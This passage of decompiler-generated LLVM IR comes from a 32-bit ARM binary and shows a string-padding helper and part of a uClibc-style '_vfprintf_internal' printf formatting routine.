  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_102ac, label %dec_label_pc_10300thread-pre-split, label %dec_label_pc_102c4

dec_label_pc_102c4:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_102c8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_102c8, i32* %r0.global-to-local, align 4
  %v1_102cc = load i32, i32* %r4.global-to-local, align 4
  %v2_102cc = sub i32 %v1_102cc, %v3_102c8
  store i32 %v2_102cc, i32* @r4, align 4
  store i32 %v3_102c8, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_102cc, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_102e0

.thread:                                          ; preds = %dec_label_pc_102c4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_102fc

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102c4
  %v0_102e0 = load i32, i32* @r5, align 4
  %v1_102e0 = urem i32 %v0_102e0, 128
  %v0_102e4 = load i32, i32* @r8, align 4
  store i32 %v0_102e4, i32* %r0.global-to-local, align 4
  %v3_102ec = trunc i32 %v1_102e0 to i8
  %v4_102ec = call i32 @_charpad(i32 %v0_102e4, i8 %v3_102ec, i32 %v2_102cc)
  store i32 %v4_102ec, i32* %r0.global-to-local, align 4
  %v1_102f0 = load i32, i32* @r4, align 4
  %v9_102f0 = icmp eq i32 %v4_102ec, %v1_102f0
  store i32 %v4_102ec, i32* %r5.global-to-local, align 4
  br i1 %v9_102f0, label %dec_label_pc_102e0.dec_label_pc_102fc_crit_edge, label %dec_label_pc_1031c

dec_label_pc_102e0.dec_label_pc_102fc_crit_edge:  ; preds = %dec_label_pc_102e0
  %v0_102fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_102fc

dec_label_pc_102fc:                               ; preds = %.thread, %dec_label_pc_102e0.dec_label_pc_102fc_crit_edge
  %v0_102fc = phi i32 [ %v0_102fc.pre, %dec_label_pc_102e0.dec_label_pc_102fc_crit_edge ], [ %v3_102c8, %.thread ]
  store i32 %v0_102fc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10300

dec_label_pc_10300thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10300

dec_label_pc_10300:                               ; preds = %dec_label_pc_10300thread-pre-split, %dec_label_pc_102fc
  %v5_1030c = phi i32 [ %arg3, %dec_label_pc_10300thread-pre-split ], [ %v0_102fc, %dec_label_pc_102fc ]
  %tmp14 = icmp slt i32 %v5_1030c, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_10300
  br label %bb15

bb:                                               ; preds = %dec_label_pc_10300
  %v5_10308 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_10308, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_15ce0.339 to i32))
  %v0_10318 = load i32, i32* %r5.global-to-local, align 4
  %v2_10318 = add i32 %storemerge, %v0_10318
  store i32 %v2_10318, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1031c

dec_label_pc_1031c:                               ; preds = %dec_label_pc_102e0, %bb15
  %v0_1031c = phi i32 [ %v4_102ec, %dec_label_pc_102e0 ], [ %v2_10318, %bb15 ]
  store i32 %v0_1031c, i32* %r0.global-to-local, align 4
  %v2_10320 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10320, i32* %r4.global-to-local, align 4
  store i32 %v6_102a4, i32* %r5.global-to-local, align 4
  ret i32 %v0_1031c

; uselistorder directives
  uselistorder i32 %v0_1031c, { 1, 0 }
  uselistorder i32 %v0_102fc, { 1, 0 }
  uselistorder i32 %v2_102cc, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1031c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_102fc, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_10328 = load i32, i32* @r5, align 4
  %v12_10328 = load i32, i32* @r7, align 4
  %v18_10328 = load i32, i32* @sb, align 4
  %v21_10328 = load i32, i32* @sl, align 4
  %v24_10328 = load i32, i32* @fp, align 4
  %v2_10330 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10330, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_10330, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10340 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10340, i32* @r5, align 4
  %v2_10344 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_10344, i32* %r0.global-to-local, align 4
  %v1_1034c = icmp slt i32 %v2_10344, 0
  br i1 %v1_1034c, label %dec_label_pc_1035c, label %dec_label_pc_10390

dec_label_pc_1035c:                               ; preds = %entry
  %v3_1035c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1035c, i32* @r4, align 4
  %v1_10360 = inttoptr i32 %v3_1035c to i8*
  store i32 %v3_1035c, i32* %r0.global-to-local, align 4
  %v3_10364 = call i32 @strlen(i8* %v1_10360)
  store i32 %v3_10364, i32* %r0.global-to-local, align 4
  %v2_10368 = icmp eq i32 %v3_10364, 0
  br i1 %v2_10368, label %bb, label %dec_label_pc_10378

bb:                                               ; preds = %dec_label_pc_1035c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_109e0

dec_label_pc_10378:                               ; preds = %dec_label_pc_1035c
  %v0_10378 = load i32, i32* @r4, align 4
  store i32 %v0_10378, i32* %r0.global-to-local, align 4
  %v0_1037c = load i32, i32* @fp, align 4
  store i32 %v0_1037c, i32* %r2.global-to-local, align 4
  %v3_10380 = inttoptr i32 %v0_1037c to i16*
  %v4_10380 = call i32 @__stdio_fwrite(i32 %v0_10378, i32 %v3_10364, i16* %v3_10380)
  store i32 %v4_10380, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109e0

dec_label_pc_10390:                               ; preds = %entry
  %v0_10390 = load i32, i32* @r5, align 4
  store i32 %v2_10330, i32* %r0.global-to-local, align 4
  %v2_10398 = call i32 @_ppfs_prepargs(i32 %v2_10330, i32 %v0_10390)
  store i32 %v2_10398, i32* %r0.global-to-local, align 4
  store i32 852, i32* @ip, align 4
  %v0_103e0 = load i32, i32* @r4, align 4
  store i32 %v0_103e0, i32* %r2.global-to-local, align 4
  %v1_10464 = bitcast i32* %stack_var_-352 to i8*
  %v4_10474 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_10480 = ptrtoint i32* %stack_var_-272 to i32
  %v2_10498 = ptrtoint i32* %stack_var_-40 to i32
  %v2_104b4 = icmp eq i32 %tmp104, 0
  %v2_107ec = ptrtoint i32* %stack_var_-200 to i32
  %v2_10830 = ptrtoint i32* %stack_var_-348 to i32
  %v2_10834 = ptrtoint i32* %stack_var_-72 to i32
  %v2_106e8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_106f4 = ptrtoint i32* %stack_var_-52 to i32
  %v7_10550 = zext i8 %tmp102 to i32
  %v2_10588 = ptrtoint i32* %stack_var_-73 to i32
  %v1_10590 = bitcast i32* %stack_var_-73 to i8*
  %v2_10598 = icmp ugt i32 %tmp104, 4
  %v7_10598 = icmp eq i32 %tmp104, 5
  %v7_1047c = ptrtoint i32* %stack_var_-280 to i32
  %v5_104ac195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_106bc = icmp ugt i32 %tmp104, 16
  %v7_106bc = icmp eq i32 %tmp104, 17
  %v2_106c0 = xor i1 %v7_106bc, true
  %v3_106c0 = and i1 %v2_106bc, %v2_106c0
  %v2_10744 = icmp ugt i32 %tmp104, 18
  %v7_10744 = icmp eq i32 %tmp104, 19
  %v2_10748 = xor i1 %v7_10744, true
  %v3_10748 = and i1 %v2_10744, %v2_10748
  %v7_107e0 = icmp eq i32 %tmp104, 20
  %v1_104f8 = add i32 %tmp104, add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -38221)
  %v2_104f8 = inttoptr i32 %v1_104f8 to i8*
  %v2_10524 = xor i1 %v7_10598, true
  %v3_10524 = and i1 %v2_10598, %v2_10524
  %v7_10558 = icmp eq i32 %tmp104, 1
  %v2_105a0 = xor i1 %v2_10598, true
  %v3_105a0 = or i1 %v7_10598, %v2_105a0
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_10608 = icmp eq i32 %tmp104, 3
  %v11_10614 = icmp eq i32 %tmp104, 4
  %v9_10484 = mul nuw nsw i32 %v4_10474, 8
  %v10_10484 = add i32 %v7_1047c, %v9_10484
  br label %dec_label_pc_103e4.outer

dec_label_pc_103e4.outer:                         ; preds = %dec_label_pc_109c4, %dec_label_pc_10390
  %v0_103e445 = phi i32 [ %v3_109c4, %dec_label_pc_109c4 ], [ %v0_103e0, %dec_label_pc_10390 ]
  %v0_10518 = phi i32 [ %stack_var_-336.4, %dec_label_pc_109c4 ], [ %tmp103, %dec_label_pc_10390 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_109c4 ], [ 0, %dec_label_pc_10390 ]
  br label %dec_label_pc_103e4.outer36

dec_label_pc_103e4.outer36:                       ; preds = %dec_label_pc_103e4.outer, %dec_label_pc_109d0
  %v0_103e444 = phi i32 [ %v0_103e445, %dec_label_pc_103e4.outer ], [ %v1_109d0, %dec_label_pc_109d0 ]
  %v5_10410 = phi i32 [ %v0_103e445, %dec_label_pc_103e4.outer ], [ %v1_10440, %dec_label_pc_109d0 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_103e4.outer ], [ %v1_108b0, %dec_label_pc_109d0 ]
  %v1_103e4188 = inttoptr i32 %v0_103e444 to i8*
  %v2_103e4189 = load i8, i8* %v1_103e4188, align 1
  %v2_103e8191 = icmp eq i8 %v2_103e4189, 0
  br i1 %v2_103e8191, label %dec_label_pc_10400, label %bb138

bb138:                                            ; preds = %dec_label_pc_103e4.outer36, %.thread6
  %v2_103e4193 = phi i8 [ %v2_103e4, %.thread6 ], [ %v2_103e4189, %dec_label_pc_103e4.outer36 ]
  %v1_103f8192 = phi i32 [ %v2_103f8, %.thread6 ], [ %v0_103e444, %dec_label_pc_103e4.outer36 ]
  %v8_103ec = icmp eq i8 %v2_103e4193, 37
  br i1 %v8_103ec, label %dec_label_pc_10400, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_103f8 = add i32 %v1_103f8192, 1
  store i32 %v2_103f8, i32* @r4, align 4
  %v1_103e4 = inttoptr i32 %v2_103f8 to i8*
  %v2_103e4 = load i8, i8* %v1_103e4, align 1
  %v2_103e8 = icmp eq i8 %v2_103e4, 0
  br i1 %v2_103e8, label %dec_label_pc_10400, label %bb138

dec_label_pc_10400:                               ; preds = %bb138, %.thread6, %dec_label_pc_103e4.outer36
  %v1_103f8.lcssa = phi i32 [ %v0_103e444, %dec_label_pc_103e4.outer36 ], [ %v2_103f8, %.thread6 ], [ %v1_103f8192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10400 = sub i32 %v1_103f8.lcssa, %v5_10410
  %v9_10400 = icmp eq i32 %v1_103f8.lcssa, %v5_10410
  br i1 %v9_10400, label %dec_label_pc_10434, label %dec_label_pc_10408

dec_label_pc_10408:                               ; preds = %dec_label_pc_10400
  store i32 %v2_10400, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_10400, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_10408
  store i32 %v5_10410, i32* %r0.global-to-local, align 4
  %v5_10418 = load i32, i32* @fp, align 4
  store i32 %v5_10418, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_10408, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_10408 ]
  store i32 66592, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_15ce0.339 to i32))
  %v0_10420 = load i32, i32* %r0.global-to-local, align 4
  %v1_10420 = load i32, i32* @r5, align 4
  %v9_10420 = icmp eq i32 %v0_10420, %v1_10420
  br i1 %v9_10420, label %dec_label_pc_10428, label %dec_label_pc_109d8

dec_label_pc_10428:                               ; preds = %bb142
  %v2_1042c = add i32 %v0_10420, %stack_var_-356.1.ph37
  store i32 %v2_1042c, i32* @ip, align 4
  %v0_10434.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10434

dec_label_pc_10434:                               ; preds = %dec_label_pc_10400, %dec_label_pc_10428
  %v0_10448 = phi i32 [ %v5_10410, %dec_label_pc_10400 ], [ %v0_10434.pre, %dec_label_pc_10428 ]
  %v1_108b0 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_10400 ], [ %v2_1042c, %dec_label_pc_10428 ]
  %v1_10434 = inttoptr i32 %v0_10448 to i8*
  %v2_10434 = load i8, i8* %v1_10434, align 1
  %v2_10438 = icmp eq i8 %v2_10434, 0
  br i1 %v2_10438, label %dec_label_pc_109e0, label %dec_label_pc_10440

dec_label_pc_10440:                               ; preds = %dec_label_pc_10434
  %v1_10440 = add i32 %v0_10448, 1
  %v2_10440 = inttoptr i32 %v1_10440 to i8*
  %v3_10440 = load i8, i8* %v2_10440, align 1
  %v7_10444 = icmp eq i8 %v3_10440, 37
  store i32 %v1_10440, i32* %r2.global-to-local, align 4
  br i1 %v7_10444, label %dec_label_pc_109d0, label %dec_label_pc_10450

dec_label_pc_10450:                               ; preds = %dec_label_pc_10440
  store i32 %v2_10330, i32* @r4, align 4
  store i32 %v2_10330, i32* %r0.global-to-local, align 4
  store i32 %v1_10440, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10464 = call i32 @_ppfs_parsespec(i8* %v1_10464)
  store i32 %v2_10330, i32* @r0, align 4
  %v0_1046c = call i32 @_ppfs_setargs()
  store i32 %v0_1046c, i32* %r0.global-to-local, align 4
  store i32 %v4_10474, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_10450
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_10450, %bb145
  %storemerge = phi i32 [ %v10_10484, %bb145 ], [ %v7_10480, %dec_label_pc_10450 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_104ac195, label %dec_label_pc_10490, label %dec_label_pc_104b0

dec_label_pc_10490:                               ; preds = %bb146, %dec_label_pc_10490
  %v5_1049c197 = phi i32 [ %v5_1049c, %dec_label_pc_10490 ], [ %v2_10498, %bb146 ]
  %v0_10490196 = phi i32 [ %v1_10494, %dec_label_pc_10490 ], [ %storemerge, %bb146 ]
  %v2_10490 = add i32 %v5_1049c197, -32
  %v3_10490 = inttoptr i32 %v2_10490 to i32*
  store i32 %v0_10490196, i32* %v3_10490, align 4
  %v0_10494 = load i32, i32* %r0.global-to-local, align 4
  %v1_10494 = add i32 %v0_10494, 8
  store i32 %v1_10494, i32* %r0.global-to-local, align 4
  %v1_1049c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_1049c = mul i32 %v1_1049c.pre, 4
  %v5_1049c = add i32 %v4_1049c, %v2_10498
  %v1_104a8 = add i32 %v1_1049c.pre, 1
  store i32 %v1_104a8, i32* %r2.global-to-local, align 4
  %v5_104ac = icmp slt i32 %v1_1049c.pre, %tmp105
  br i1 %v5_104ac, label %dec_label_pc_10490, label %dec_label_pc_104b0

dec_label_pc_104b0:                               ; preds = %dec_label_pc_10490, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_104b4, label %dec_label_pc_104bc, label %dec_label_pc_104e0

dec_label_pc_104bc:                               ; preds = %dec_label_pc_104b0
  %v3_104bc = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_108b0, i32* @ip, align 4
  %v1_104c8 = inttoptr i32 %v3_104bc to i32*
  %v2_104c8 = load i32, i32* %v1_104c8, align 4
  store i32 %v2_104c8, i32* %r0.global-to-local, align 4
  %v1_104cc = and i32 %v0_10518, 3840
  store i32 %v1_108b0, i32* %r2.global-to-local, align 4
  %v3_104d4 = ashr i32 %v1_108b0, 31
  %v4_104d8 = inttoptr i32 %v2_104c8 to i16*
  %v5_104d8 = call i32 @_store_inttype(i16* %v4_104d8, i32 %v1_104cc, i32 %v1_108b0, i32 %v3_104d4)
  store i32 %v5_104d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109c4

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104b0
  br i1 %tmp207, label %dec_label_pc_1067c, label %dec_label_pc_104e8

dec_label_pc_104e8:                               ; preds = %dec_label_pc_104e0
  %v3_104f8 = load i8, i8* %v2_104f8, align 1
  %v4_104f8 = zext i8 %v3_104f8 to i32
  %v7_104fc = icmp eq i8 %v3_104f8, 10
  br i1 %v7_104fc, label %dec_label_pc_10508, label %bb147

bb147:                                            ; preds = %dec_label_pc_104e8
  br label %bb151

dec_label_pc_10508:                               ; preds = %dec_label_pc_104e8
  %v1_10518 = and i32 %v0_10518, 64
  %v2_10518 = icmp eq i32 %v1_10518, 0
  br i1 %v2_10518, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_10508
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_10508, %bb150
  br i1 %v3_10524, label %.thread, label %dec_label_pc_1052c

.thread:                                          ; preds = %bb151
  %v5_10524 = sub nsw i32 0, %v4_104f8
  br label %dec_label_pc_10544

dec_label_pc_1052c:                               ; preds = %bb151
  br i1 %v7_10608, label %bb152, label %dec_label_pc_10538

bb152:                                            ; preds = %dec_label_pc_1052c
  br label %dec_label_pc_10544

dec_label_pc_10538:                               ; preds = %dec_label_pc_1052c
  br i1 %v7_10558, label %dec_label_pc_10548, label %dec_label_pc_10544

dec_label_pc_10544:                               ; preds = %.thread, %bb152, %dec_label_pc_10538
  %v0_1057081 = phi i32 [ %v5_10524, %.thread ], [ %v4_104f8, %bb152 ], [ %v4_104f8, %dec_label_pc_10538 ]
  br label %dec_label_pc_10548

dec_label_pc_10548:                               ; preds = %dec_label_pc_10538, %dec_label_pc_10544
  %v0_1057080 = phi i32 [ %v0_1057081, %dec_label_pc_10544 ], [ %v4_104f8, %dec_label_pc_10538 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_10544 ], [ 6, %dec_label_pc_10538 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_10548 = load i32, i32* %stack_var_-348, align 4
  %v1_1054c = icmp slt i32 %v3_10548, 0
  %v7_10550. = select i1 %v1_1054c, i32 %v7_10550, i32 32
  store i32 %v7_10550., i32* @sb, align 4
  br i1 %v7_10558, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_10548
  store i32 %v2_10498, i32* %r2.global-to-local, align 4
  %v2_10560 = load i32, i32* @ip, align 4
  %v5_10560 = mul i32 %v2_10560, 4
  %v6_10560 = add i32 %v5_10560, %v2_10498
  %v2_10564 = add i32 %v6_10560, -276
  %v3_10564 = inttoptr i32 %v2_10564 to i32*
  %v4_10564 = load i32, i32* %v3_10564, align 4
  %v2_1056c = and i32 %v4_10564, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_10548, %.thread15
  %storemerge93 = phi i32 [ %v2_1056c, %.thread15 ], [ 1024, %dec_label_pc_10548 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_1057080, i32* @r2, align 4
  %v3_10574 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_10574, i32* @r1, align 4
  %v0_10578 = call i32 @_load_inttype()
  store i32 %v0_10578, i32* @r2, align 4
  %v0_10584 = load i32, i32* @r1, align 4
  store i32 %v0_10584, i32* @r3, align 4
  store i32 %v2_10588, i32* %r0.global-to-local, align 4
  %v2_10590 = call i32 @_uintmaxtostr(i8* %v1_10590)
  store i32 %v2_10590, i32* %r0.global-to-local, align 4
  store i32 %v2_10590, i32* @r4, align 4
  br i1 %v3_105a0, label %bb160, label %dec_label_pc_105a4

dec_label_pc_105a4:                               ; preds = %bb157
  %v3_10590 = inttoptr i32 %v2_10590 to i8*
  %v3_105a4 = load i8, i8* %v3_10590, align 1
  %v7_105a8 = icmp eq i8 %v3_105a4, 45
  %v2_105b0 = or i32 %v0_10518, 2
  %v2_105b0.stack_var_-336.0 = select i1 %v7_105a8, i32 %v2_105b0, i32 %v0_10518
  br i1 %v7_105a8, label %.thread17, label %dec_label_pc_105c4

.thread17:                                        ; preds = %dec_label_pc_105a4
  %v3_105b4 = add i32 %v2_10590, 1
  store i32 %v3_105b4, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_105c4:                               ; preds = %dec_label_pc_105a4
  %v1_105c4 = and i32 %v2_105b0.stack_var_-336.0, 2
  %v2_105c4 = icmp eq i32 %v1_105c4, 0
  br i1 %v2_105c4, label %dec_label_pc_105d0, label %bb158

bb158:                                            ; preds = %dec_label_pc_105c4
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_105d0:                               ; preds = %dec_label_pc_105c4
  %v1_105d0 = urem i32 %v2_105b0.stack_var_-336.0, 2
  %v2_105d0 = icmp eq i32 %v1_105d0, 0
  br i1 %v2_105d0, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_105d0
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_105d0, %bb159
  %v0_1062c = phi i32 [ %v2_10590, %bb157 ], [ %v3_105b4, %.thread17 ], [ %v2_10590, %dec_label_pc_105d0 ], [ %v2_10590, %bb159 ], [ %v2_10590, %bb158 ]
  %v0_105e8 = phi i32 [ %v0_10518, %bb157 ], [ %v2_105b0, %.thread17 ], [ %v0_10518, %dec_label_pc_105d0 ], [ %v0_10518, %bb159 ], [ %v0_10518, %bb158 ]
  %v3_105d8 = load i32, i32* %stack_var_-348, align 4
  %v1_105e0 = icmp slt i32 %v3_105d8, 0
  br i1 %v1_105e0, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_105d8, %bb160 ]
  %v0_10610 = phi i32 [ 1, %bb161 ], [ %v3_105d8, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_105e8 = and i32 %v0_105e8, 16
  %v2_105e8 = icmp eq i32 %v1_105e8, 0
  %v2_105f4 = sub i32 %v2_10588, %v0_1062c
  store i32 %v2_105f4, i32* @r5, align 4
  br i1 %v2_105e8, label %bb169, label %dec_label_pc_105fc

dec_label_pc_105fc:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_105fc
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_105fc, %bb163
  br i1 %v7_10608, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_10610, %v2_105f4
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_10614, label %dec_label_pc_1061c, label %bb169

dec_label_pc_1061c:                               ; preds = %bb167
  %v1_1061c = inttoptr i32 %v0_1062c to i8*
  %v2_1061c = load i8, i8* %v1_1061c, align 1
  %v7_10620 = icmp eq i8 %v2_1061c, 48
  br i1 %v7_10620, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_1061c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_1061c
  %v2_10628 = add i32 %v2_105f4, 1
  store i32 %v2_10628, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_1066c = phi i32 [ %v0_10610, %bb167 ], [ %v0_10610, %bb162 ], [ 1, %bb168 ], [ %v2_10628, %.thread24 ], [ %v0_10610, %bb166 ]
  %v1_1062c = inttoptr i32 %v0_1062c to i8*
  %v2_1062c = load i8, i8* %v1_1062c, align 1
  %v7_10630 = icmp eq i8 %v2_1062c, 48
  br i1 %v7_10630, label %dec_label_pc_10638, label %dec_label_pc_10668

dec_label_pc_10638:                               ; preds = %bb169
  %v0_1063c = load i32, i32* @r6, align 4
  %v7_10640 = icmp slt i32 %v0_1063c, 6
  br i1 %v7_10640, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_10638
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_10638, %bb170
  br i1 %v7_10558, label %.thread27, label %dec_label_pc_1065c

.thread27:                                        ; preds = %bb171
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -38248), i32* @r4, align 4
  br label %dec_label_pc_10674

dec_label_pc_1065c:                               ; preds = %bb171
  %v2_1065c = icmp eq i32 %v5_1066c, 0
  br i1 %v2_1065c, label %bb172, label %dec_label_pc_10668

bb172:                                            ; preds = %dec_label_pc_1065c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10674

dec_label_pc_10668:                               ; preds = %dec_label_pc_1065c, %bb169
  %v2_10668 = sub i32 %v5_1066c, %v2_105f4
  %tmp211 = icmp ugt i32 %v5_1066c, %v2_105f4
  br i1 %tmp211, label %.thread85, label %dec_label_pc_10674

.thread85:                                        ; preds = %dec_label_pc_10668
  store i32 %v2_10668, i32* @r8, align 4
  br label %dec_label_pc_10880thread-pre-split

dec_label_pc_10674:                               ; preds = %dec_label_pc_10668, %.thread27, %bb172
  %v1_10884.pre205 = phi i32 [ %v2_105f4, %dec_label_pc_10668 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10880thread-pre-split

dec_label_pc_1067c:                               ; preds = %dec_label_pc_104e0
  br i1 %tmp208, label %dec_label_pc_106bc, label %dec_label_pc_10684

dec_label_pc_10684:                               ; preds = %dec_label_pc_1067c
  %v3_10694 = load i32, i32* %stack_var_-72, align 4
  %v0_10698 = load i32, i32* @fp, align 4
  store i32 %v0_10698, i32* %r0.global-to-local, align 4
  %v1_1069c = inttoptr i32 %v3_10694 to i32*
  %v2_1069c = load i32, i32* %v1_1069c, align 4
  store i32 %v2_1069c, i32* %r2.global-to-local, align 4
  %v3_1069c = add i32 %v3_10694, 4
  %v4_1069c = inttoptr i32 %v3_1069c to i32*
  %v5_1069c = load i32, i32* %v4_1069c, align 4
  %v8_106a0 = call i32 @_fpmaxtostr(i32 %v0_10698, double bitcast (i64 sext (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -89452) to i64) to double), i32 %v2_1069c, i32 %v5_1069c, i32 %v2_10830, i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -89452))
  store i32 %v8_106a0, i32* %r0.global-to-local, align 4
  %v1_106a4 = icmp slt i32 %v8_106a0, 0
  br i1 %v1_106a4, label %dec_label_pc_109d8, label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %dec_label_pc_10684
  %v2_106b0 = add i32 %v8_106a0, %v1_108b0
  store i32 %v2_106b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_109c4

dec_label_pc_106bc:                               ; preds = %dec_label_pc_1067c
  br i1 %v3_106c0, label %dec_label_pc_10744, label %dec_label_pc_106c4

